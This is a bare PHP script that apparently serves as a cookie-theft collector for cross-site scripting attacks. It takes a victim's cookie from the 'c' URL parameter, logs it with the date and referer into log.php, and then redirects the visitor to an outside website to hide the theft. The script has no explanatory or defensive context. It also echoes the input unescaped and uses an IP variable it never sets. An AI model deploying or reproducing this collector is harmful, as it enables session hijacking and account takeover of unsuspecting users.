<?php
$cookie = $_GET['c'];
echo "Welcome <strong> $cookie</strong>  <br>";
$date=date("j F, Y, g:i a");;
$referer = getenv('HTTP_REFERER');
$fp = fopen('log.php', 'a');
fwrite($fp, 'Cookie: '.$cookie.'<br /> IP: '.$ip. '<br /> Date and time: ' .$date.'<br /> Referer: ' .$referer.'<br /><br />');
fclose($fp);
header ("Location: http://www.theplanetreports.com");
?>
